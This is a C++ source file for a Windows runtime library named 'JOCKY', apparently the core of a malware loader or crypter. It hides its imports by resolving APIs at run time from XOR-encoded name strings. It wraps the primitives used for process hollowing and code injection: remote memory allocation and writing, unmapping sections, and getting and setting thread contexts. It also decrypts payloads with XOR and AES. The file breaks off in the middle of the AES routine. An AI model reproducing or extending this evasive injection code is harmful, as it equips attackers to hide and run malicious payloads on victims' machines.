// runtime.cpp — JOCKY Runtime Library v2
// Dynamic resolution: only GetModuleHandleA + GetProcAddress as static imports.
// No standard headers — everything is defined inline.
// All API name strings are XOR-encoded at compile time via string_hide.h.

#define NULL 0

#include "string_hide.h"

// ── CRT intrinsics required in nostdlib mode ─────────────────────────────────
#pragma clang optimize off
extern "C" void* memset(void* dst, int c, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)c;
    return dst;
}
extern "C" void* memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
    return dst;
}
extern "C" void* memmove(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    if (d < s) { while (n--) *d++ = *s++; }
    else        { d += n; s += n; while (n--) *--d = *--s; }
    return dst;
}
#pragma clang optimize on

// ── Basic Windows types ──────────────────────────────────────────────────────
typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned long       DWORD;
typedef unsigned long long  QWORD;
typedef long long           SQWORD;
typedef void*               PVOID;
typedef PVOID               HANDLE;
typedef int                 BOOL;
typedef unsigned long long  SIZE_T;
typedef long long           NTSTATUS;

#define MEM_COMMIT        0x1000
#define MEM_RESERVE       0x2000
#define MEM_RELEASE       0x8000
#define PAGE_READWRITE    0x04
#define PAGE_EXECUTE_READ 0x20
#define STD_OUTPUT_HANDLE ((DWORD)-11)
#define INFINITE          0xFFFFFFFF
#define PROCESS_ALL_ACCESS 0x1F0FFF
#define CONTEXT_FULL      0x10000B
#define CALG_AES_256      0x00006610
#define CALG_SHA_256      0x0000800C
#define PROV_RSA_AES      24
#define CRYPT_VERIFYCONTEXT 0xF0000000
#define HP_HASHVAL        0x0002

// ── STARTUPINFOA ─────────────────────────────────────────────────────────────
struct JockyStartupInfo {
    DWORD  cb;
    PVOID  lpReserved;
    PVOID  lpDesktop;
    PVOID  lpTitle;
    DWORD  dwX, dwY, dwXSize, dwYSize;
    DWORD  dwXCountChars, dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    PVOID  lpReserved2;
    PVOID  hStdInput, hStdOutput, hStdError;
};

struct JockyProcessInfo {
    HANDLE hProcess, hThread;
    DWORD  dwProcessId, dwThreadId;
};

// ── Function pointer typedefs ────────────────────────────────────────────────
typedef PVOID (__stdcall *Fn_VirtualAlloc)  (PVOID,SIZE_T,DWORD,DWORD);
typedef PVOID (__stdcall *Fn_VirtualAllocEx)(HANDLE,PVOID,SIZE_T,DWORD,DWORD);
typedef BOOL  (__stdcall *Fn_VirtualProtect)(PVOID,SIZE_T,DWORD,DWORD*);
typedef BOOL  (__stdcall *Fn_VirtualProtectEx)(HANDLE,PVOID,SIZE_T,DWORD,DWORD*);
typedef BOOL  (__stdcall *Fn_VirtualFree)   (PVOID,SIZE_T,DWORD);
typedef void  (__stdcall *Fn_RtlCopyMemory) (PVOID,const PVOID,SIZE_T);
typedef void  (__stdcall *Fn_RtlZeroMemory) (PVOID,SIZE_T);
typedef BOOL  (__stdcall *Fn_ReadProcessMemory) (HANDLE,PVOID,PVOID,SIZE_T,SIZE_T*);
typedef BOOL  (__stdcall *Fn_WriteProcessMemory)(HANDLE,PVOID,const PVOID,SIZE_T,SIZE_T*);
typedef BOOL  (__stdcall *Fn_WriteFile)     (HANDLE,const PVOID,DWORD,DWORD*,PVOID);
typedef HANDLE(__stdcall *Fn_GetStdHandle)  (DWORD);
typedef void  (__stdcall *Fn_ExitProcess)   (unsigned int);
typedef HANDLE(__stdcall *Fn_CreateThread)  (PVOID,SIZE_T,PVOID,PVOID,DWORD,DWORD*);
typedef DWORD (__stdcall *Fn_WaitForSingleObject)(HANDLE,DWORD);
typedef DWORD (__stdcall *Fn_WaitForMultipleObjects)(DWORD,HANDLE*,BOOL,DWORD);
typedef DWORD (__stdcall *Fn_SuspendThread) (HANDLE);
typedef DWORD (__stdcall *Fn_ResumeThread)  (HANDLE);
typedef BOOL  (__stdcall *Fn_GetThreadContext)(HANDLE,PVOID);
typedef BOOL  (__stdcall *Fn_SetThreadContext)(HANDLE,const PVOID);
typedef long  (__stdcall *Fn_InterlockedInc)(long volatile*);
typedef long  (__stdcall *Fn_InterlockedDec)(long volatile*);
typedef BOOL  (__stdcall *Fn_CreateProcessA)(const char*,char*,PVOID,PVOID,BOOL,DWORD,PVOID,const char*,PVOID,PVOID);
typedef HANDLE(__stdcall *Fn_OpenProcess)   (DWORD,BOOL,DWORD);
typedef BOOL  (__stdcall *Fn_TerminateProcess)(HANDLE,unsigned int);
typedef DWORD (__stdcall *Fn_GetCurrentProcessId)(void);
typedef DWORD (__stdcall *Fn_GetCurrentThreadId)(void);
typedef DWORD (__stdcall *Fn_GetTickCount) (void);
typedef BOOL  (__stdcall *Fn_CloseHandle)  (HANDLE);
typedef HANDLE(__stdcall *Fn_CreateFileA)  (const char*,DWORD,DWORD,PVOID,DWORD,DWORD,HANDLE);
typedef BOOL  (__stdcall *Fn_ReadFile)     (HANDLE,PVOID,DWORD,DWORD*,PVOID);
typedef DWORD (__stdcall *Fn_GetFileSize)  (HANDLE,DWORD*);
typedef PVOID (__stdcall *Fn_GetProcAddress)(HANDLE,const char*);
typedef PVOID (__stdcall *Fn_GetModuleHandleA)(const char*);
typedef HANDLE(__stdcall *Fn_LoadLibraryA) (const char*);
typedef DWORD (__stdcall *Fn_GetLastError) (void);
// NT
typedef NTSTATUS(__stdcall *Fn_NtUnmapViewOfSection)(HANDLE,PVOID);
typedef NTSTATUS(__stdcall *Fn_NtQueryInformationProcess)(HANDLE,DWORD,PVOID,DWORD,DWORD*);
// Crypto (advapi32)
typedef BOOL  (__stdcall *Fn_CryptAcquireContextA)(PVOID*,const char*,const char*,DWORD,DWORD);
typedef BOOL  (__stdcall *Fn_CryptCreateHash)(PVOID,DWORD,PVOID,DWORD,PVOID*);
typedef BOOL  (__stdcall *Fn_CryptHashData)(PVOID,const BYTE*,DWORD,DWORD);
typedef BOOL  (__stdcall *Fn_CryptGetHashParam)(PVOID,DWORD,BYTE*,DWORD*,DWORD);
typedef BOOL  (__stdcall *Fn_CryptDestroyHash)(PVOID);
typedef BOOL  (__stdcall *Fn_CryptImportKey)(PVOID,const BYTE*,DWORD,PVOID,DWORD,PVOID*);
typedef BOOL  (__stdcall *Fn_CryptDecrypt)(PVOID,PVOID,BOOL,DWORD,BYTE*,DWORD*);
typedef BOOL  (__stdcall *Fn_CryptDestroyKey)(PVOID);
typedef BOOL  (__stdcall *Fn_CryptReleaseContext)(PVOID,DWORD);

// ── Static imports (only two allowed) ───────────────────────────────────────
extern "C" PVOID __stdcall GetProcAddress(PVOID hModule, const char* name);
extern "C" PVOID __stdcall GetModuleHandleA(const char* name);

// ── Module cache ─────────────────────────────────────────────────────────────
static PVOID g_k32   = NULL;
static PVOID g_ntdll = NULL;
static PVOID g_adv   = NULL;

static PVOID get_k32() {
    if (!g_k32) {
        // "kernel32.dll" XOR 0x5A
        USE_STR(n, XB(0x31), XB(0x3F), XB(0x28), XB(0x34), XB(0x3F), XB(0x36), XB(0x69), XB(0x68), XB(0x74), XB(0x3E), XB(0x36), XB(0x36))
        g_k32 = GetModuleHandleA(n);
        ZERO_STR(n);
    }
    return g_k32;
}

static PVOID get_ntdll() {
    if (!g_ntdll) {
        // "ntdll.dll" XOR 0x5A
        USE_STR(n, XB(0x34), XB(0x2E), XB(0x3E), XB(0x36), XB(0x36), XB(0x74), XB(0x3E), XB(0x36), XB(0x36))
        g_ntdll = GetModuleHandleA(n);
        ZERO_STR(n);
    }
    return g_ntdll;
}

static PVOID get_adv32() {
    if (!g_adv) {
        static Fn_LoadLibraryA fn_ll = NULL;
        if (!fn_ll) {
            // "LoadLibraryA" XOR 0x5A
            USE_STR(s, XB(0x16), XB(0x35), XB(0x3B), XB(0x3E), XB(0x16), XB(0x33), XB(0x38), XB(0x28), XB(0x3B), XB(0x28), XB(0x23), XB(0x1B))
            fn_ll = (Fn_LoadLibraryA)GetProcAddress(get_k32(), s);
            ZERO_STR(s);
        }
        if (fn_ll) {
            // "advapi32.dll" XOR 0x5A
            USE_STR(n, XB(0x3B), XB(0x3E), XB(0x2C), XB(0x3B), XB(0x2A), XB(0x33), XB(0x69), XB(0x68), XB(0x74), XB(0x3E), XB(0x36), XB(0x36))
            g_adv = fn_ll(n);
            ZERO_STR(n);
        }
    }
    return g_adv;
}

// Single-name resolvers (take a pre-decoded stack buffer, zero it after)
static PVOID k32s(const char* name) {
    return GetProcAddress(get_k32(), name);
}
static PVOID nts(const char* name) {
    return GetProcAddress(get_ntdll(), name);
}
static PVOID advs(const char* name) {
    return GetProcAddress(get_adv32(), name);
}


// ============================================================
// v1 API (retained)
// ============================================================

extern "C" HANDLE jocky_get_stdout() {
    static Fn_GetStdHandle fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x09), XB(0x2E), XB(0x3E), XB(0x12), XB(0x3B), XB(0x34), XB(0x3E), XB(0x36), XB(0x3F)) // GetStdHandle
        fn = (Fn_GetStdHandle)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(STD_OUTPUT_HANDLE);
    return NULL;
}

extern "C" void jocky_exit(unsigned int code) {
    static Fn_ExitProcess fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1F), XB(0x22), XB(0x33), XB(0x2E), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29)) // ExitProcess
        fn = (Fn_ExitProcess)k32s(s); ZERO_STR(s);
    }
    if (fn) fn(code);
    while (1) {}
}

extern "C" PVOID jocky_alloc(DWORD size) {
    static Fn_VirtualAlloc fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x1B), XB(0x36), XB(0x36), XB(0x35), XB(0x39)) // VirtualAlloc
        fn = (Fn_VirtualAlloc)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return NULL;
}

extern "C" void jocky_write(HANDLE handle, const void* buf, DWORD size) {
    static Fn_WriteFile fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0D), XB(0x28), XB(0x33), XB(0x2E), XB(0x3F), XB(0x1C), XB(0x33), XB(0x36), XB(0x3F)) // WriteFile
        fn = (Fn_WriteFile)k32s(s); ZERO_STR(s);
    }
    if (fn) { DWORD w = 0; fn(handle, (PVOID)buf, size, &w, NULL); }
}

extern "C" HANDLE jocky_create_thread(PVOID entry, PVOID param) {
    static Fn_CreateThread fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E)) // CreateThread
        fn = (Fn_CreateThread)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(NULL, 0, entry, param, 0, NULL);
    return NULL;
}

extern "C" DWORD jocky_wait(HANDLE handle, DWORD ms) {
    static Fn_WaitForSingleObject fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0D), XB(0x3B), XB(0x33), XB(0x2E), XB(0x1C), XB(0x35), XB(0x28), XB(0x09), XB(0x33), XB(0x34), XB(0x3D), XB(0x36), XB(0x3F), XB(0x15), XB(0x38), XB(0x30), XB(0x3F), XB(0x39), XB(0x2E)) // WaitForSingleObject
        fn = (Fn_WaitForSingleObject)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(handle, ms);
    return 0xFFFFFFFF;
}

extern "C" BOOL jocky_protect(PVOID addr, DWORD size, DWORD prot, DWORD* old) {
    static Fn_VirtualProtect fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x0A), XB(0x28), XB(0x35), XB(0x2E), XB(0x3F), XB(0x39), XB(0x2E)) // VirtualProtect
        fn = (Fn_VirtualProtect)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(addr, size, prot, old);
    return 0;
}


// ============================================================
// v2 — Memory
// ============================================================

extern "C" PVOID jocky_alloc_ex(HANDLE hProc, DWORD size, DWORD type, DWORD prot) {
    static Fn_VirtualAllocEx fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x1B), XB(0x36), XB(0x36), XB(0x35), XB(0x39), XB(0x1F), XB(0x22)) // VirtualAllocEx
        fn = (Fn_VirtualAllocEx)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, NULL, size, type, prot);
    return NULL;
}

extern "C" BOOL jocky_protect_ex(HANDLE hProc, PVOID addr, DWORD size, DWORD prot, DWORD* old) {
    static Fn_VirtualProtectEx fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x0A), XB(0x28), XB(0x35), XB(0x2E), XB(0x3F), XB(0x39), XB(0x2E), XB(0x1F), XB(0x22)) // VirtualProtectEx
        fn = (Fn_VirtualProtectEx)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, addr, size, prot, old);
    return 0;
}

extern "C" BOOL jocky_free(PVOID addr, DWORD size) {
    static Fn_VirtualFree fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0C), XB(0x33), XB(0x28), XB(0x2E), XB(0x2F), XB(0x3B), XB(0x36), XB(0x1C), XB(0x28), XB(0x3F), XB(0x3F)) // VirtualFree
        fn = (Fn_VirtualFree)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(addr, size ? size : 0, size ? 0x4000 : MEM_RELEASE);
    return 0;
}

extern "C" void jocky_memcopy(PVOID dst, PVOID src, DWORD size) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    for (DWORD i = 0; i < size; i++) d[i] = s[i];
}

extern "C" void jocky_memzero(PVOID buf, DWORD size) {
    BYTE* p = (BYTE*)buf;
    for (DWORD i = 0; i < size; i++) p[i] = 0;
}

extern "C" BOOL jocky_read_proc(HANDLE hProc, PVOID addr, PVOID buf, DWORD size) {
    static Fn_ReadProcessMemory fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x08), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29), XB(0x17), XB(0x3F), XB(0x37), XB(0x35), XB(0x28), XB(0x23)) // ReadProcessMemory
        fn = (Fn_ReadProcessMemory)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, addr, buf, size, NULL);
    return 0;
}

extern "C" BOOL jocky_write_proc(HANDLE hProc, PVOID addr, PVOID buf, DWORD size) {
    static Fn_WriteProcessMemory fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0D), XB(0x28), XB(0x33), XB(0x2E), XB(0x3F), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29), XB(0x17), XB(0x3F), XB(0x37), XB(0x35), XB(0x28), XB(0x23)) // WriteProcessMemory
        fn = (Fn_WriteProcessMemory)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, addr, buf, size, NULL);
    return 0;
}


// ============================================================
// v2 — Process
// ============================================================

extern "C" HANDLE jocky_create_proc(const char* cmdline, DWORD flags) {
    static Fn_CreateProcessA fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29), XB(0x1B)) // CreateProcessA
        fn = (Fn_CreateProcessA)k32s(s); ZERO_STR(s);
    }
    if (!fn) return NULL;
    JockyStartupInfo si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    JockyProcessInfo pi;
    memset(&pi, 0, sizeof(pi));
    BOOL ok = fn(NULL, (char*)cmdline, NULL, NULL, 0, flags, NULL, NULL, &si, &pi);
    if (ok) {
        static Fn_CloseHandle fncl = NULL;
        if (!fncl) {
            USE_STR(s, XB(0x19), XB(0x36), XB(0x35), XB(0x29), XB(0x3F), XB(0x12), XB(0x3B), XB(0x34), XB(0x3E), XB(0x36), XB(0x3F)) // CloseHandle
            fncl = (Fn_CloseHandle)k32s(s); ZERO_STR(s);
        }
        if (fncl) fncl(pi.hThread);
        return pi.hProcess;
    }
    return NULL;
}

extern "C" HANDLE jocky_open_proc(DWORD access, DWORD pid) {
    static Fn_OpenProcess fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x15), XB(0x2A), XB(0x3F), XB(0x34), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29)) // OpenProcess
        fn = (Fn_OpenProcess)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(access, 0, pid);
    return NULL;
}

extern "C" BOOL jocky_terminate_proc(HANDLE hProc, unsigned int code) {
    static Fn_TerminateProcess fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0E), XB(0x3F), XB(0x28), XB(0x37), XB(0x33), XB(0x34), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29)) // TerminateProcess
        fn = (Fn_TerminateProcess)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, code);
    return 0;
}

extern "C" DWORD jocky_get_pid() {
    static Fn_GetCurrentProcessId fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x19), XB(0x2F), XB(0x28), XB(0x28), XB(0x3F), XB(0x34), XB(0x2E), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29), XB(0x13), XB(0x3E)) // GetCurrentProcessId
        fn = (Fn_GetCurrentProcessId)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn();
    return 0;
}

extern "C" DWORD jocky_get_tid() {
    static Fn_GetCurrentThreadId fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x19), XB(0x2F), XB(0x28), XB(0x28), XB(0x3F), XB(0x34), XB(0x2E), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x13), XB(0x3E)) // GetCurrentThreadId
        fn = (Fn_GetCurrentThreadId)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn();
    return 0;
}

extern "C" DWORD jocky_get_tick() {
    static Fn_GetTickCount fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x0E), XB(0x33), XB(0x39), XB(0x31), XB(0x19), XB(0x35), XB(0x2F), XB(0x34), XB(0x2E)) // GetTickCount
        fn = (Fn_GetTickCount)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn();
    return 0;
}

extern "C" BOOL jocky_close(HANDLE h) {
    static Fn_CloseHandle fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x36), XB(0x35), XB(0x29), XB(0x3F), XB(0x12), XB(0x3B), XB(0x34), XB(0x3E), XB(0x36), XB(0x3F)) // CloseHandle
        fn = (Fn_CloseHandle)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(h);
    return 0;
}


// ============================================================
// v2 — Thread
// ============================================================

extern "C" DWORD jocky_wait_all(HANDLE* handles, DWORD count, DWORD ms) {
    static Fn_WaitForMultipleObjects fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0D), XB(0x3B), XB(0x33), XB(0x2E), XB(0x1C), XB(0x35), XB(0x28), XB(0x17), XB(0x2F), XB(0x36), XB(0x2E), XB(0x33), XB(0x2A), XB(0x36), XB(0x3F), XB(0x15), XB(0x38), XB(0x30), XB(0x3F), XB(0x39), XB(0x2E), XB(0x29)) // WaitForMultipleObjects
        fn = (Fn_WaitForMultipleObjects)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(count, handles, 1, ms);
    return 0xFFFFFFFF;
}

extern "C" DWORD jocky_suspend(HANDLE hThread) {
    static Fn_SuspendThread fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x09), XB(0x2F), XB(0x29), XB(0x2A), XB(0x3F), XB(0x34), XB(0x3E), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E)) // SuspendThread
        fn = (Fn_SuspendThread)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hThread);
    return (DWORD)-1;
}

extern "C" DWORD jocky_resume(HANDLE hThread) {
    static Fn_ResumeThread fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x08), XB(0x3F), XB(0x29), XB(0x2F), XB(0x37), XB(0x3F), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E)) // ResumeThread
        fn = (Fn_ResumeThread)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hThread);
    return (DWORD)-1;
}

extern "C" BOOL jocky_get_ctx(HANDLE hThread, PVOID ctx) {
    static Fn_GetThreadContext fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E)) // GetThreadContext
        fn = (Fn_GetThreadContext)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hThread, ctx);
    return 0;
}

extern "C" BOOL jocky_set_ctx(HANDLE hThread, const PVOID ctx) {
    static Fn_SetThreadContext fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x09), XB(0x3F), XB(0x2E), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E)) // SetThreadContext
        fn = (Fn_SetThreadContext)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hThread, ctx);
    return 0;
}

extern "C" long jocky_atomic_inc(long volatile* ptr) {
    static Fn_InterlockedInc fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x13), XB(0x34), XB(0x2E), XB(0x3F), XB(0x28), XB(0x36), XB(0x35), XB(0x39), XB(0x31), XB(0x3F), XB(0x3E), XB(0x13), XB(0x34), XB(0x39), XB(0x28), XB(0x3F), XB(0x37), XB(0x3F), XB(0x34), XB(0x2E)) // InterlockedIncrement
        fn = (Fn_InterlockedInc)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(ptr);
    return ++(*ptr);
}

extern "C" long jocky_atomic_dec(long volatile* ptr) {
    static Fn_InterlockedDec fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x13), XB(0x34), XB(0x2E), XB(0x3F), XB(0x28), XB(0x36), XB(0x35), XB(0x39), XB(0x31), XB(0x3F), XB(0x3E), XB(0x1E), XB(0x3F), XB(0x39), XB(0x28), XB(0x3F), XB(0x37), XB(0x3F), XB(0x34), XB(0x2E)) // InterlockedDecrement
        fn = (Fn_InterlockedDec)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(ptr);
    return --(*ptr);
}


// ============================================================
// v2 — NT (ntdll)
// ============================================================

extern "C" NTSTATUS jocky_nt_unmap(HANDLE hProc, PVOID baseAddr) {
    static Fn_NtUnmapViewOfSection fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x14), XB(0x2E), XB(0x0F), XB(0x34), XB(0x37), XB(0x3B), XB(0x2A), XB(0x0C), XB(0x33), XB(0x3F), XB(0x2D), XB(0x15), XB(0x3C), XB(0x09), XB(0x3F), XB(0x39), XB(0x2E), XB(0x33), XB(0x35), XB(0x34)) // NtUnmapViewOfSection
        fn = (Fn_NtUnmapViewOfSection)nts(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, baseAddr);
    return -1;
}

extern "C" NTSTATUS jocky_nt_query_proc(HANDLE hProc, DWORD infoClass,
                                         PVOID buf, DWORD size) {
    static Fn_NtQueryInformationProcess fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x14), XB(0x2E), XB(0x0B), XB(0x2F), XB(0x3F), XB(0x28), XB(0x23), XB(0x13), XB(0x34), XB(0x3C), XB(0x35), XB(0x28), XB(0x37), XB(0x3B), XB(0x2E), XB(0x33), XB(0x35), XB(0x34), XB(0x0A), XB(0x28), XB(0x35), XB(0x39), XB(0x3F), XB(0x29), XB(0x29)) // NtQueryInformationProcess
        fn = (Fn_NtQueryInformationProcess)nts(s); ZERO_STR(s);
    }
    if (fn) return fn(hProc, infoClass, buf, size, NULL);
    return -1;
}


// ============================================================
// v2 — File
// ============================================================

extern "C" HANDLE jocky_file_open(const char* path, DWORD access,
                                   DWORD share, DWORD disposition) {
    static Fn_CreateFileA fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x1C), XB(0x33), XB(0x36), XB(0x3F), XB(0x1B)) // CreateFileA
        fn = (Fn_CreateFileA)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(path, access, share, NULL, disposition, 0, NULL);
    return (HANDLE)-1;
}

extern "C" DWORD jocky_file_read(HANDLE hFile, PVOID buf, DWORD size) {
    static Fn_ReadFile fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x08), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x1C), XB(0x33), XB(0x36), XB(0x3F)) // ReadFile
        fn = (Fn_ReadFile)k32s(s); ZERO_STR(s);
    }
    if (!fn) return 0;
    DWORD read = 0;
    fn(hFile, buf, size, &read, NULL);
    return read;
}

extern "C" DWORD jocky_file_size(HANDLE hFile) {
    static Fn_GetFileSize fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x1C), XB(0x33), XB(0x36), XB(0x3F), XB(0x09), XB(0x33), XB(0x20), XB(0x3F)) // GetFileSize
        fn = (Fn_GetFileSize)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(hFile, NULL);
    return 0;
}

extern "C" void jocky_file_close(HANDLE hFile) {
    static Fn_CloseHandle fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x36), XB(0x35), XB(0x29), XB(0x3F), XB(0x12), XB(0x3B), XB(0x34), XB(0x3E), XB(0x36), XB(0x3F)) // CloseHandle
        fn = (Fn_CloseHandle)k32s(s); ZERO_STR(s);
    }
    if (fn) fn(hFile);
}

// Load entire file into VirtualAlloc'd buffer; caller frees with jocky_free
extern "C" PVOID jocky_file_load(const char* path) {
    HANDLE h = jocky_file_open(path,
        0x80000000 /*GENERIC_READ*/,
        1          /*FILE_SHARE_READ*/,
        3          /*OPEN_EXISTING*/);
    if (h == (HANDLE)-1) return NULL;

    DWORD sz = jocky_file_size(h);
    if (sz == 0 || sz == 0xFFFFFFFF) { jocky_file_close(h); return NULL; }

    PVOID buf = jocky_alloc(sz + 1);
    if (!buf) { jocky_file_close(h); return NULL; }

    DWORD rd = jocky_file_read(h, buf, sz);
    jocky_file_close(h);

    if (rd == 0) { jocky_free(buf, 0); return NULL; }
    ((BYTE*)buf)[rd] = 0;
    return buf;
}


// ============================================================
// v2 — Crypto
// ============================================================

extern "C" void jocky_xor_buf(PVOID buf, DWORD size, PVOID key, DWORD keylen) {
    BYTE* b = (BYTE*)buf;
    const BYTE* k = (const BYTE*)key;
    if (!keylen) return;
    for (DWORD i = 0; i < size; i++) b[i] ^= k[i % keylen];
}

extern "C" DWORD jocky_aes_decrypt(PVOID ciphertext, DWORD ctlen,
                                    PVOID key, DWORD keylen) {
    static Fn_CryptAcquireContextA  fn_acq  = NULL;
    static Fn_CryptCreateHash       fn_ch   = NULL;
    static Fn_CryptHashData         fn_hd   = NULL;
    static Fn_CryptImportKey        fn_ik   = NULL;
    static Fn_CryptDecrypt          fn_dec  = NULL;
    static Fn_CryptDestroyKey       fn_dk   = NULL;
    static Fn_CryptReleaseContext   fn_rc   = NULL;

    if (!fn_acq) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1B), XB(0x39), XB(0x2B), XB(0x2F), XB(0x33), XB(0x28), XB(0x3F), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E), XB(0x1B)) // CryptAcquireContextA
        fn_acq = (Fn_CryptAcquireContextA)advs(s); ZERO_STR(s);
    }
    if (!fn_ch) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x12), XB(0x3B), XB(0x29), XB(0x32)) // CryptCreateHash
        fn_ch = (Fn_CryptCreateHash)advs(s); ZERO_STR(s);
    }
    if (!fn_hd) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x12), XB(0x3B), XB(0x29), XB(0x32), XB(0x1E), XB(0x3B), XB(0x2E), XB(0x3B)) // CryptHashData
        fn_hd = (Fn_CryptHashData)advs(s); ZERO_STR(s);
    }
    if (!fn_ik) {
